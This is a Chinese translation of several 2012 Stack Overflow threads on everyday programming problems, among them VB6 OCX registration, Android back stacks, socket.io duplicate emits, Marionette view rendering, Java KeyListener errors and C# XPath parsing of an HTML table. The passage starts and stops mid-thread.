将这些文件复制到应用程序的主机目录将不足以让依赖于 .OCX 文件中提供的组件的应用程序访问它们。这是因为应用程序将通过其注册的编程 ID（“ProgID”）创建 COM 对象的实例，Windows 将依次转换为 CLSID 和提供对象实现的 COM 进程内服务器 DLL。如果 OCX 未注册，则没有 COM 信息允许 Windows 执行所需的映射。

ProgID、ClsID 和相关类型库信息通过 RegSvr32 实用程序“发布”到 Windows，该实用程序实际上只是加载目标 DLL/OCX 并专门调用 COM DLL 入口点“DllRegisterServer”，它允许 DLL 发布其 COM注册信息。如果不这样做，则没有可用的 COM 注册，并且对 OCX/DLL 中承载的对象的调用将失败。

缺少重要的 COM 注册信息是将 OCX 文件复制到主机文件夹的原因不足以使消费应用程序利用其中托管的 COM 对象。

**文件扩展名的附加信息**

*   .OCX - 实际上，它只是一个具有不同扩展名的 COM DLL。这些名称是作为旧的“* *O* *LE * *C* *ontrol E* *x* *tension”绰号下的 VB 扩展的容器给出的，因此是 OCX。
*   .DEP - Windows 依赖文件。这些文件往往具有 Visual Basic“安装应用程序”的传统，通常包含有关给定 EXE 或 DLL 对其他 DLL 的依赖关系的信息。例如，A.EXE 可能依赖于 B.DLL，但 B.DLL 也可能依赖于 C.DLL。
*   .OCA - OCX 类型库缓存。这通常是动态构建的，并在需要时重建。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-13T08:39:02.513

如果您真的想实现这些 OCX（和 DLL）的并行部署而不诉诸 VB6 自动注册黑客，最好是使用免注册 COM 的应用程序清单。

我们使用[UMMM](https://github.com/wqweto/UMMM)在构建时自动创建这些，在您的情况下，清单创建将是一次性的工作。

这是在您的情况下使用 UMMM 的方法。首先创建一个`App.ini`像这样的文件

```
Identity App.exe YourCompany.App "Application 1.0"
File TABCTL32.OCX
File MSWINSCK.OCX
File MSMAPI32.OCX
File FTP.OCX
File COMDLG32.OCX
# more OCXs/DLLs here... 
```

`UMMM.exe`像这样“编译”清单

```
c:>UMMM.exe App.ini App.exe.manifest 
```

要么放在`App.exe.manifest`你旁边，要么像这样使用 Windows SDK`App.exe`将其作为资源嵌入[`mt.exe`](http://msdn.microsoft.com/en-us/library/windows/desktop/aa375649%28v=vs.85%29.aspx)

```
c:>mt.exe -nologo -manifest App.exe.manifest -outputresource:App.exe;1 
```

取消注册 OCX/DLL（这很重要）并测试您的应用程序。

# android - 清除 Activity 后台堆栈

> ID：12392293
> 
> 赞同：1
> 
> 时间：2012-09-12T16:06:49.517
> 
> 标签：android, android-intent, fragment

我有一个类似这样的应用程序结构：

1[项活动](https://developer.android.com/reference/android/app/Activity.html)

n[片段](https://developer.android.com/guide/components/fragments.html)

App流程是这样的：

（活动1）（片段A）=>（活动1）（片段B）=>（活动1）（片段C）=> ...

因此，单个活动类的多个实例被实例化，其中包含不同的片段。

另外，当我在 Fragment B 中时（假设），我进行了 Fragment 事务以将其[替换](https://developer.android.com/reference/android/app/FragmentTransaction.html#replace%28int,%20android.app.Fragment,%20java.lang.String%29)为 Fragment B'，因此不会创建新的 Activity，并且 Fragment B 将替换为 Fragment B'。

现在，在这个事务中，我希望包含 Fragment A 和所有其他先前启动的活动的活动从[backstack](https://developer.android.com/guide/components/tasks-and-back-stack.html)中弹出。

可以使用意图标志（[CLEAR_TOP](https://developer.android.com/reference/android/content/Intent.html#FLAG_ACTIVITY_CLEAR_TOP)）打开根活动，但在这里我正在执行[FragmentTransaction](https://developer.android.com/reference/android/app/Activity.html#q=fragment%20transaction)并希望清除此事件的活动回栈。

有什么帮助吗？

如何在不使用 FLAG_ACTIVITY_CLEAR_TOP 的情况下清除活动回栈，因为我没有在这里进行 Intent 调用？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T16:26:37.357

您可以在他的类中存储对活动 A 的静态引用。当您需要从历史记录中删除 A 时，您只需调用 ActivityA.getInstance().finish();

如果您在 A 活动中有多个实例，请将对其的引用放入 Vector 并使用 ActivityA.getInstance(0).finish(); 完成。

# python - 使用 Python 的过滤功能

> ID：12392296
> 
> 赞同：1
> 
> 时间：2012-09-12T16:06:53.513
> 
> 标签：python, primes, lambda

这里有两个看似等效的函数版本，用于从数字列表中过滤出素数。

**版本 1**

```
def prime (mylist):
        for i in range(2, 8):
            return filter(lambda x: x == i or x % i, mylist) 
```

**版本 2**

```
def prime2 (mylist):
    nums = mylist
    for i in range(2, 8): 
        nums = filter(lambda x: x == i or x % i, nums)
    return nums

print prime([2,3,4,5,6,7,8,9,10,11,12,13,14,15])  
   >> [2, 3, 5, 7, 9, 11, 13, 15]
print prime2([2,3,4,5,6,7,8,9,10,11,12,13,14,15]) 
   >> [2, 3, 5, 7, 11, 13] 
```

版本 1 返回错误的结果。为什么？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-12T16:10:43.027

第一个版本只测试`i == 2`。换句话说，它只测试 2 是否是一个因子，而不是按照您的意图测试从 2 到 7 的所有整数。这就是为什么它会（正确地）过滤掉所有偶数，但会（错误地）留下不是素数的奇数，比如 9 和 15。试试这个来明确地看到它：

```
def prime (mylist):
    for i in range(2, 8):
        print i # added to make things explicit; it's not necessary
        return filter(lambda x: x == i or x % i, mylist)

def prime2 (mylist):
    nums = mylist
    for i in range(2, 8):
        print i # added to make things explicit; it's not necessary
        nums = filter(lambda x: x == i or x % i, nums)
    return nums

print prime([2,3,4,5,6,7,8,9,10,11,12,13,14,15])
>>> 2
>>> [2, 3, 5, 7, 9, 11, 13, 15]
print prime2([2,3,4,5,6,7,8,9,10,11,12,13,14,15])
>>> 2
>>> 3
>>> 4
>>> 5
>>> 6
>>> 7
>>> [2, 3, 5, 7, 11, 13] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-12T16:12:14.003

第一个函数在第一次循环迭代中返回，因此您永远不会针对 i>2 进行测试。

# npapi - 如何在 NPAPI 插件中捕获 onload、onerror

> ID：12392298
> 
> 赞同：0
> 
> 时间：2012-09-12T16:07:05.873
> 
> 标签：npapi

在javascript中，我的代码如下：

```
function start() {  

  var start = document.getElementById('start'); //start is object for my plugin
  if(start){
    getAsLoad(start);
  }
} 
function getAsLoad(startObj) {
var load = startObj.startMethod();

  // Handle progress, success, and errors
  load.onload = loaded;
  load.onerror = errorHandler;
}

function loaded(evt) {  
  var StringData = evt.target.result;
  alert(StringData);      
} // Like loaded similar code for errorHandling 
```

如何在普通的 NPAPI 插件中启动它，事件处理机制，我知道在 firebreadth 中它是一个小菜一碟，根据我的要求，我不能使用它。所以这种事情我必须在 NPAPI 插件中实现。提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-13T04:53:42.000

最简单的方法是让 javascript 调用您的插件。

但是，如果您想从插件中执行此操作，则只需获取 DOM 窗口 NPObject 并开始调用方法并获取属性等。

例如，要获得“start”，您可以使用“document”调用 getProperty，然后使用“getElementById”和“start”作为参数对生成的 NPObject 调用 Invoke。

如果你想要一个回调到你的插件中，那么棘手的部分就会出现，在这种情况下，你必须创建一个处理 InvokeDefault 的 NPObject，它是在回调触发时调用的。这有点痛苦，但从那里细节与javascript相同，只是更麻烦一点

# java - Eclipse 构建技术

> ID：12392303
> 
> 赞同：0
> 
> 时间：2012-09-12T16:07:20.783
> 
> 标签：java, eclipse, build, dependencies, gradle

我已经使用eclipse很长一段时间了。我已经将它与 ant、maven 和现在与 gradle 一起使用。我了解 eclipse 构建（默认为`bin`文件夹）和 gradle 将构建文件保存在其中`build`（尽管可以配置这些文件夹名称）

我有一组相互依赖的eclipse项目。Gradle 可以`evaluationDependsOn`在 gradle 文件中明确指示，确保在当前项目构建之前构建所有依赖项

但是，当我手动选择项目并执行干净的构建（我通常禁用`build automatically`）时，它无法按顺序解决依赖关系。但是当我看到这些项目的构建路径的项目选项卡时，我正确地看到了依赖关系。

所以现在，我访问每个项目并按照特定顺序进行干净构建以清除所有 eclipse 错误。我想知道我是否可以修复它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T16:12:11.807

我可以弄清楚它是`Window > Preferences > General > Workspace > Build Order`

像很多时候一样，在 Stackoverflow 中写问题可以让你更好地理解问题。

# tomcat - Groovy Redis 插件超时问题

> ID：12392308
> 
> 赞同：0
> 
> 时间：2012-09-12T16:07:28.723
> 
> 标签：tomcat, grails, groovy, redis, weblogic

在带有 JRockit 的 WebLogic 11 上的 Grails 2.0.4 上使用 Redis 插件 1.0.0（我们也在 Tomcat 7 上进行了测试），我们正在使用以下内容更新 Redis，但不断收到超时异常...

```
template.execute(new RedisCallback<Object>() {
   public Object doInRedis(RedisConnection connection) throws DataAccessException {
      connection.multi()    
      for( def cacheUpdate : cacheList)
         connection.zAdd(cacheUpdate[0], cacheUpdate[1], cacheUpdate[2]);
     connection.exec()
      return null
   }
}, true); 
```

代码`cacheList`很小的时候工作正常，但是我们试图加载大约 1M 的小对象，这会产生超时问题。

```
java.net.SocketTimeoutException: Read timed out
        at jrockit.net.SocketNativeIO.socketRead(SocketNativeIO.java:46)
        at java.net.SocketInputStream.read(SocketInputStream.java:129)
        at java.net.SocketInputStream.read(SocketInputStream.java:90)
        at redis.clients.util.RedisInputStream.fill(RedisInputStream.java:110)
        at redis.clients.util.RedisInputStream.readByte(RedisInputStream.java:46)
        at redis.clients.jedis.Protocol.process(Protocol.java:59)
        at redis.clients.jedis.Protocol.read(Protocol.java:122)
        at redis.clients.jedis.Connection.getAll(Connection.java:207)
        at redis.clients.jedis.BinaryTransaction.exec(BinaryTransaction.java:25)
        at com.oppen.fund.FundService$1.doInRedis(FundService.groovy:397) 
```

我们将 Redis 配置中的超时设置为 -1，但 Redis 似乎不支持它，我假设 -1 表示没有超时？

```
cacheLoaderJedisConnectionFactory(JedisConnectionFactory) {      
   hostName = '${grails.cache.redis.hostName}'
   port = '${grails.cache.redis.port}'
   timeout = -1
   password = null
   poolConfig = ref('grailsCacheJedisPoolConfig')       
} 
```

我们在 WebLogic 11 和 Tomcat 7 上都试过这个，同样的超时问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T19:48:23.743

**

## 更新

**

经过进一步调查，使用`-1`Redis 缓存连接超时是问题所在；我们使用了一个非常大的正值，从而消除了超时问题。

# jquery - 获取复选框值 Jquery Mobile

> ID：12392313
> 
> 赞同：7
> 
> 时间：2012-09-12T16:07:42.213
> 
> 标签：jquery, jquery-mobile

我正在设置我的 jquery 移动复选框，像这样..

```
 $("#checkbox-2a").attr("checked", settings.DEnabled).checkboxradio("refresh"); 
```

这是标记

```
 <fieldset data-role="controlgroup" data-mini="true" style="text-align:center;">
            <input type="checkbox" name="checkbox-2a" id="checkbox-2a" class="custom" />
            <label for="checkbox-2a">
                Enable D</label>
.. 
```

复选框被正确选中。但是现在当我想用这段代码检索一个值时..

```
 settings.DEnabled = $("#checkbox-2a").attr("checked"); 
```

当我调试它返回“已检查”时，当我查看标记时，即使在 ui 中正确的检查布尔值时复选框正在更新。我在标记中没有看到“已检查”属性。

如何获取/查找复选框的值？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-09-12T16:09:45.963

`attr`不返回布尔值，您可以使用`prop`方法：[http ://api.jquery.com/prop/#entry-examples](http://api.jquery.com/prop/#entry-examples)

```
settings.DEnabled = $("#checkbox-2a").prop("checked"); 
```

或`is`方法：

```
settings.DEnabled = $("#checkbox-2a").is(":checked"); 
```

# node.js - node.js + socket.io - 重复的 websocket 写入？

> ID：12392316
> 
> 赞同：2
> 
> 时间：2012-09-12T16:07:46.400
> 
> 标签：node.js, websocket, socket.io

我是 node.js 和 socket.io 场景的新手，所以这可能是一个简单的修复......但这里有。我有以下 POC 用于通过 UDP 接收消息并将它们回显到浏览器。在 55555 上接收到 UDP 消息，执行 websocket 写入，客户端在其浏览器中看到数据。但是，当另一个客户端连接到服务器时，在接收到数据报时会执行四次 websocket 写入 - 我相信每个客户端两次，因为附加的数据现在显示了*两次*。启动第三个客户端显示六次 websocket 写入 - 附加数据现在出现三次。

任何想法是什么原因造成的？愚蠢的错误？误解？漏洞？

服务器：

```
var dgram = require("dgram");
var udpserver = dgram.createSocket("udp4");
udpserver.bind(55555);  //udp listener

var express = require("express");
var app = express();
var http = require('http');
var server = http.createServer(app);
var io = require('socket.io').listen(server);
server.listen(12345);  //tcp http listener

io.sockets.on('connection', function (socket) {
    udpserver.on('message', function (msg, rinfo) {
            io.sockets.emit('update', msg.toString());
    });
}); 
```

客户：

```
<!DOCTYPE HTML>
<script src="http://code.jquery.com/jquery-1.8.1.min.js"></script>
<script src="http://localhost:12345/socket.io/socket.io.js"></script>
<script type="text/javascript">
    $(document).ready(function() {
        var socket = new io.connect('http://localhost:12345');
        socket.on('update', function (data) {
            $("#stuff").append(data + "<br>");
        });
     });
</script>
<div id=stuff></div>
</html> 
```

`node`以下是显示第一个客户端连接后和第二个客户端连接后发送的数据的一些输出：

```
info  - socket.io started
debug - served static content /socket.io.js
debug - client authorized
info  - handshake authorized xrMZtzv9HPSngRYzMibw
debug - setting request GET /socket.io/1/websocket/xrMZtzv9HPSngRYzMibw
debug - set heartbeat interval for client xrMZtzv9HPSngRYzMibw
debug - client authorized for
debug - websocket writing 1::
debug - websocket writing 5:::{"name":"update","args":["test1\n"]}
debug - emitting heartbeat for client xrMZtzv9HPSngRYzMibw
debug - websocket writing 2::
debug - set heartbeat timeout for client xrMZtzv9HPSngRYzMibw
debug - got heartbeat packet
debug - cleared heartbeat timeout for client xrMZtzv9HPSngRYzMibw
debug - set heartbeat interval for client xrMZtzv9HPSngRYzMibw
debug - served static content /socket.io.js
debug - client authorized
info  - handshake authorized VJKxI4y8TV9tcYjEMibx
debug - setting request GET /socket.io/1/websocket/VJKxI4y8TV9tcYjEMibx
debug - set heartbeat interval for client VJKxI4y8TV9tcYjEMibx
debug - client authorized for
debug - websocket writing 1::
debug - websocket writing 5:::{"name":"update","args":["test1\n"]}
debug - websocket writing 5:::{"name":"update","args":["test1\n"]}
debug - websocket writing 5:::{"name":"update","args":["test1\n"]}
debug - websocket writing 5:::{"name":"update","args":["test1\n"]} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-12T16:26:52.127

据我所知，无需节点进行测试；只要客户端不发送您需要处理的任何数据，您就对在 socket.io 连接事件上做任何事情并不真正感兴趣，因此您应该能够忽略它们。您想要的只是接收 UDP 事件并向所有连接的客户端广播，这应该很简单；

```
...
var io = require('socket.io').listen(server);
server.listen(12345);  //tcp http listener

udpserver.on('message', function (msg, rinfo) {
    io.sockets.emit('update', msg.toString());
}); 
```

只是为了完整性；您当前的代码所做的是为每个新的 socket.io 连接添加一个新的 UDP 消息回调。回调广播到*所有*客户端，这意味着当第二个客户端连接时，所有广播将对所有客户端发生 2 次，对于 3 个客户端，对所有客户端 3 次等。您只需设置*一次*UDP 消息处理程序，因为它会广播无论如何，所有连接的客户。

# sql - 如何使用命令行从 sqlserver 2008 创建 DDL？

> ID：12392317
> 
> 赞同：0
> 
> 时间：2012-09-12T16:07:46.003
> 
> 标签：sql, sql-server, sql-server-2008, ddl

我正在尝试仅使用命令行从 SQLServer 2008 获取完整的 DB DDL，有没有办法用 BCP 做到这一点？或其他 SQLServer 工具？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T08:59:07.103

如果您愿意使用第三方工具，您可以使用 SQL Compare 命令行通过将数据库与空数据库进行比较来完成。

sqlcompare.exe /s1:yourserver /db1:yourdatabase /s2:yourserver /db2:ablankdatabase that you create inadvance /scriptfile:myscriptfile.sql

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-12T18:10:52.340

我创建了[SMOscript](http://devio.wordpress.com/2011/06/26/smoscript-0-19/)，它为数据库中的所有对象创建一个脚本，或者为每个对象创建一个脚本文件。

# backbone.js - Marionette ItemView 尝试在 init 获取完成之前呈现模板

> ID：12392332
> 
> 赞同：2
> 
> 时间：2012-09-12T16:08:28.047
> 
> 标签：backbone.js, marionette

**更新**

我为我的项目创建了一个解决方法。我将一个空模板设置为此视图默认模板（实际上包含加载消息和 throbber，以防进一步延迟）并设置模型更改事件以在准备好时用 groupTemplate 替换视图 $el html。这在我的开发、测试和生产机器上进行了无缝过渡，但是，如果在检索模型数据时生产速度变慢，它实际上会显示加载消息。

```
define([
  'underscore',
  'backbone',
  'marionette',
  'models/group',
  'text!templates/shared/empty.html', // include empty template
  'text!templates/groups/group.html'
], function(_, Backbone, Marionette, groupModel, emptyTemplate, groupTemplate){
  var GroupView = Backbone.Marionette.ItemView.extend({
    initialize: function() {
      var view = this;

      this.model = new groupModel({id:this.options.groupid});

      // listen to the model change and display the real template when fired.
      this.model.on('change', function(){
        view.$el.html(_.template(groupTemplate, view.model.attributes));
      });

      this.model.fetch();
    },
    template: emptyTemplate // display empty template be default
  });
  return GroupView;
}); 
```

我有一个使用嵌套列布局的单一布局（在这种情况下为三列）。嵌套布局与相应的视图一起调用，它需要这些视图并将它们显示在它自己的区域中。（如果有更好的方法，请告诉我）。

我的问题是 col2 的 GroupView （嵌套三列布局）正在使用 ItemView 并且正在使用没有数据开始的模型。该模型使用 url 而不是从集合中检索数据，因此必须使用 fetch 来检索数据。ItemView 正在尝试使用没有数据的模型来呈现它的模板，并且无法找到模型字段。给我以下错误。

> 未捕获的 ReferenceError：未定义组名

有没有办法延迟渲染，或者 ItemView 有没有像 colletionsView 这样的无证 emptyView？如果有更好的方法来处理这个问题，请告诉我。

路由器控制器

```
group: function(groupid) {
  // require and setup our three column layout
  require([
    'views/layouts/three-column', 'views/shared/left-user-menu',
    'views/groups/group', 'views/shared/location'
  ], function(threeColumnLayout, leftView, groupView, locationView) {
  App.wrapper.currentView.main.show(new threeColumnLayout({
    views: {
      col1: new leftView(),
      col2: new groupView({groupid: groupid}),
      col3: new locationView()}
  }));
} 
```

嵌套布局（三列）

```
define([
  'underscore',
  'backbone',
  'marionette',
  'text!templates/layouts/three-column.html'
], function(_, Backbone, Marionette, threeColumnTemplate) {
  var Layout = Backbone.Marionette.Layout.extend({
    initialize: function(options) {
      var layout = this;

      this.on('render', function(options){
        layout.col1.show(options.options.views.col1);
        layout.col2.show(options.options.views.col2);
        layout.col3.show(options.options.views.col3);
      });
    },
    tagName: 'div',
    template: threeColumnTemplate,
    regions: {
      col1: '#col1',
      col2: '#col2',
      col3: '#col3'
    }
  });

  return Layout;
}); 
```

组项目视图

```
define([
  'underscore',
  'backbone',
  'marionette',
  'models/group',
  'text!templates/groups/group.html'
], function(_, Backbone, Marionette, groupModel, groupTemplate){
  var GroupView = Backbone.Marionette.ItemView.extend({
    initialize: function() {
      this.model = new groupModel({id:this.options.groupid});
      this.model.fetch();
    },
    template: groupTemplate
  });
  return GroupView;
}); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T16:58:40.823

当您知道您的数据已准备好时，获取并呈现。使用 Promise 来简化主干获取返回 Promise 的过程。

```
initialize: function () {
  var that = this;
  var fetching = this.model.fetch();

  fetching.done(function() { that.render(); });
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-12T20:48:44.390

有类似的问题

[Backbone Marionette 在获取完成前显示](https://stackoverflow.com/questions/11317691/backbone-marionette-displaying-before-fetch-complete)

```
this.model = new groupModel({id:this.options.groupid}); 
```

将触发渲染，因为有一个正在传递的对象。在获取 ..

我的正常解决方法是在提取水合对象之前为模板所需的任何内容设置空白默认值。

# fusioncharts - 融合图表“placeValuesInside”选项也不适用于组合图表“MSColumn3DLineDY”

> ID：12392336
> 
> 赞同：1
> 
> 时间：2012-09-12T16:08:35.333
> 
> 标签：fusioncharts

我的 Fusion Charts 版本是 3.0.3（请不要建议我更新它 - 这次不是一个选项）。

这是我图表的截图：

![在此处输入图像描述](../Images/cb2fa68a83ebbd09bfe47260b4fc5e69.png)

问题是条形图和趋势线图的重叠值。这就是为什么我想使用值为“1”的“placeValuesInside”来强制条形图在条形之外显示其值。

以下是我的部分选择：

```
<chart placeValuesInside='0' palette='2' animation='1' formatNumberScale='0' labelDisplay='Rotate' slantLabels='1' seriesNameInToolTip='0' lineThickness='6' showValues='1' rotateValues='0' > 
```

你能建议做什么吗？我想我应该指出哪个图表的选项是有效的？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T15:01:57.913

placeValuesInside='0' 将使数据值显示在条形之外，但是当列的屋顶非常靠近画布上边距时，这将不适用。

因此，首先，placeValuesInside='0' 是默认行为，其次使用 canvasTopMargin 来保证该选项将起作用也不是一个好的解决方案。

我使用了其他选项： valuePadding='0'

问题是值文本和列末尾之间存在默认填充。

# java - KeyListener 停止使用 Action 或 Mouse Listener？

> ID：12392342
> 
> 赞同：-1
> 
> 时间：2012-09-12T16:09:07.393
> 
> 标签：java, keyboard, key, keylistener, keyevent

我想添加 KeyListener 以通过键盘获取输入，所以我添加了 keyListener 并实现了它的方法，但是当我运行它并按下任何键时它可以工作，但在控制台中它会这样写：

```
 Exception in thread "AWT-EventQueue-0" java.lang.UnsupportedOperationException: Not supported yet.
at Calculator.keyReleased(Calculator.java:520)
at java.awt.Component.processKeyEvent(Unknown Source)
at java.awt.Component.processEvent(Unknown Source)
at java.awt.Container.processEvent(Unknown Source)
at java.awt.Window.processEvent(Unknown Source)
at java.awt.Component.dispatchEventImpl(Unknown Source)
at java.awt.Container.dispatchEventImpl(Unknown Source)
at java.awt.Window.dispatchEventImpl(Unknown Source)
at java.awt.Component.dispatchEvent(Unknown Source)
at java.awt.KeyboardFocusManager.redispatchEvent(Unknown Source)
at java.awt.DefaultKeyboardFocusManager.dispatchKeyEvent(Unknown Source)
at java.awt.DefaultKeyboardFocusManager.preDispatchKeyEvent(Unknown Source)
at java.awt.DefaultKeyboardFocusManager.typeAheadAssertions(Unknown Source)
at java.awt.DefaultKeyboardFocusManager.dispatchEvent(Unknown Source)
at java.awt.Component.dispatchEventImpl(Unknown Source)
at java.awt.Container.dispatchEventImpl(Unknown Source)
at java.awt.Window.dispatchEventImpl(Unknown Source)
at java.awt.Component.dispatchEvent(Unknown Source)
at java.awt.EventQueue.dispatchEventImpl(Unknown Source)
at java.awt.EventQueue.access$200(Unknown Source)
at java.awt.EventQueue$3.run(Unknown Source)
at java.awt.EventQueue$3.run(Unknown Source)
at java.security.AccessController.doPrivileged(Native Method)
at java.security.ProtectionDomain$1.doIntersectionPrivilege(Unknown Source)
at java.security.ProtectionDomain$1.doIntersectionPrivilege(Unknown Source)
at java.awt.EventQueue$4.run(Unknown Source)
at java.awt.EventQueue$4.run(Unknown Source)
at java.security.AccessController.doPrivileged(Native Method)
at java.security.ProtectionDomain$1.doIntersectionPrivilege(Unknown Source)
at java.awt.EventQueue.dispatchEvent(Unknown Source)
at java.awt.EventDispatchThread.pumpOneEventForFilters(Unknown Source)
at java.awt.EventDispatchThread.pumpEventsForFilter(Unknown Source)
at java.awt.EventDispatchThread.pumpEventsForHierarchy(Unknown Source)
at java.awt.EventDispatchThread.pumpEvents(Unknown Source)
at java.awt.EventDispatchThread.pumpEvents(Unknown Source)
at java.awt.EventDispatchThread.run(Unknown Source) 
```

在这个keylistener工作正常之后，但是当我点击它停止工作的任何按钮时，我按下键但没有任何反应。我的代码：

```
 @Override
public void keyPressed(KeyEvent e) {

    try{

        switch (e.getKeyCode())

{
case KeyEvent.VK_NUMPAD0:
case KeyEvent.VK_0:
     num0();
     break;
case KeyEvent.VK_NUMPAD1:
case KeyEvent.VK_1:
     num1();
     break;
case KeyEvent.VK_NUMPAD2:
case KeyEvent.VK_2:
    num2();
     break;
case KeyEvent.VK_NUMPAD3:
case KeyEvent.VK_3:
    num3();
     break;
case KeyEvent.VK_NUMPAD4:
case KeyEvent.VK_4:
    num4();
     break;
case KeyEvent.VK_NUMPAD5:
case KeyEvent.VK_5:
    num5();
     break;
case KeyEvent.VK_NUMPAD6:
case KeyEvent.VK_6:
    num6();
     break;
case KeyEvent.VK_NUMPAD7:
case KeyEvent.VK_7:
    num7();
     break;
case KeyEvent.VK_NUMPAD8:
case KeyEvent.VK_8:
    num8();
     break;
case KeyEvent.VK_NUMPAD9:
case KeyEvent.VK_9:
    num9();
     break;
case KeyEvent.VK_BACK_SPACE:
     back();
     break;
case KeyEvent.VK_DELETE:
     clear();
     break;
case KeyEvent.VK_ENTER:
    equals();
     break;
case KeyEvent.VK_ADD:
    bAdd();
    break;
case KeyEvent.VK_DECIMAL:
    bDot();
    break;
case KeyEvent.VK_MULTIPLY:
      bMul();
     break;
case KeyEvent.VK_SUBTRACT:
    bSub();
   break;
case KeyEvent.VK_DIVIDE:
    bDiv();
   break;
default:

}
}
catch(UnsupportedOperationException ex){}

}

@Override
public void keyReleased(KeyEvent e) {
    throw new UnsupportedOperationException("Not supported yet.");// line 520
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T16:13:55.947

你的程序抛出了异常

```
at Calculator.keyReleased(Calculator.java:520) 
```

它还引发了以下类型的异常：

```
java.lang.UnsupportedOperationException: Not supported yet. 
```

因此，您似乎在`Calculator.java`文件的第 520 行调用了一个尚不支持的例程。

如果您可以将方法发布到它中断的位置，然后标记它中断的行，我们可以为您提供进一步的帮助。

# javascript - 合并 TinyMCE（jQuery 插件）文件

> ID：12392352
> 
> 赞同：3
> 
> 时间：2012-09-12T16:10:04.200
> 
> 标签：javascript, jquery, tinymce

我正在使用 TinyMCE jQuery 插件。目前唯一预加载的文件是 jquery.tinymce.js。

当我的使用 TinyMCE 的模块被加载时，它会使用下面的代码进行初始化。发生这种情况时，会加载大量 TinyMCE 文件，我正在 Chrome 窗口中查看这些文件。如果我点击另一个模块，然后回来，TinyMCE 文件*不会*重新加载，这是有道理的；该实用程序正在检查已加载的内容，并动态加载所需的文件。

我想要做的是预加载我需要的所有 TinyMCE 文件。我想我可以只查看 Chrome 选项卡，查看已加载的文件，并将它们连接到一个主 TinyMCE 文件中。我尝试从简单开始，并在 jquery.tinymce.js 之后连接它加载的第一个文件 langs/en.js。但这会产生 TinyMCE 未定义的脚本错误。我已经搞砸了很多，似乎没有任何工作。

有没有一种简单的方法可以做到这一点？我只想手动将我需要的所有 TinyMCE 文件连接到一个主文件中（这不是手动的，我编写了一个简单的实用程序来执行此操作，但这无关紧要）。

如何才能做到这一点？

我可以在 jQuery 插件对象上调用某种初始化方法来启动进程，*然后*处理所有帮助程序 TinyMCE 文件吗？

TinyMCE 初始化代码：

```
data.inputs.itemDescription.tinymce({
    // Location of TinyMCE script
    script_url: '/shared/tinymce/jscripts/tiny_mce/tiny_mce.js',

    // General options
    theme: "advanced",
    skin: "custom",
    plugins: "style,layer,table,advhr,advlink,inlinepopups,preview,contextmenu,paste,nonbreaking",

    // Theme options
    theme_advanced_buttons1: "bold,italic,underline,formatselect,bullist,numlist,link,code,preview",
    theme_advanced_buttons2: "tablecontrols,|,hr",
    theme_advanced_buttons3: "",
    theme_advanced_buttons4: "",
    theme_advanced_toolbar_location: "top",
    theme_advanced_toolbar_align: "left",
    theme_advanced_statusbar_location: "",
    theme_advanced_resizing: true
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-13T09:57:58.557

在“TinyMCE 开发包”中已经有一种压缩 tinymce 文件的方法。它是一个简单的 ant 工具，但可以正常工作。

我强烈建议每个 tinymce 用户不要使用 jQuery 构建。这是一个麻烦的根源，并且在处理键盘输入时，对象创建的 jQuery 开销使 tinymce 变慢。最好使用常规的 tinymce 构建并另外加载常规的 jQuery 库。

# c# - 在 HTML 表格的特定行中获取单元格

> ID：12392353
> 
> 赞同：1
> 
> 时间：2012-09-12T16:10:04.990
> 
> 标签：c#, html, pattern-matching

我正在开发一个 C# 控制台应用程序。最终目标是在表格中找到特定行，然后单击链接以下载由旧 Web 应用程序生成的文件。（这已经很老了，所以没有可供我使用的 API）

该表遵循如下结构：

```
<html>
<head>
    <title>Test Table Page</title>
</head>
<body>
    <table border="1" cellpadding="3" cellspacing="5">
        <tr>
            <td>Test Row One</td>
            <td>Test Content</td>
        </tr>
        <tr>
            <td>Test Row Two</td>
            <td>Test Content</td>
        </tr>
        <tr>
            <td>Test Row Three</td>
            <td>Test Content</td>
        </tr>
    </table>
</body> 
```

我想要做的是获取与**Test Row Two**关联的测试内容。我需要使用相邻单元格中的报告名称。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T18:09:42.707

如果您认为 HTML 将与 XML 兼容，则可以使用如下所示的 XML 解析器（使用 XPath）。*就个人而言，我喜欢避免使用 HTML 解析器，因为它们又大又复杂。就像使用电锯将树枝折成两半一样。有时，别无他法，但如果有更简单的解决方案，请先尝试。*

**相关代码片段：**

```
var l_contentCell = l_navigator.SelectSingleNode( "//td[preceding-sibling::td/text()='Test Row Two']" ); 
```

**完整源代码：**

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Xml;
using System.Xml.Linq;
using System.Xml.XPath;

namespace XmlSandbox {
    class Program {
        static void Main( string[] args ) {

            string l_xmlLiteral =
                "<html>\n" +
                "   <head>\n" +
                "       <title>Test Table Page</title>\n" +
                "   </head>\n" +
                "   <body>\n" +
                "       <table border=\"1\" cellpadding=\"3\" cellspacing=\"5\">\n" +
                "           <tr>\n" +
                "               <td>Test Row One</td>\n" +
                "               <td>Test Content</td>\n" +
                "           </tr>\n" +
                "           <tr>\n" +
                "               <td>Test Row Two</td>\n" +
                "               <td>Test Content</td>\n" +
                "           </tr>\n" +
                "           <tr>\n" +
                "               <td>Test Row Three</td>\n" +
                "               <td>Test Content</td>\n" +
                "           </tr>\n" +
                "       </table>\n" +
                "   </body>\n" +
                "</html>";

            var l_document = XDocument.Parse( l_xmlLiteral );
            var l_navigator = l_document.CreateNavigator();

            var l_contentCell = l_navigator.SelectSingleNode( "//td[preceding-sibling::td/text()='Test Row Two']" );

            Console.WriteLine( l_contentCell.Value );

        }
    }
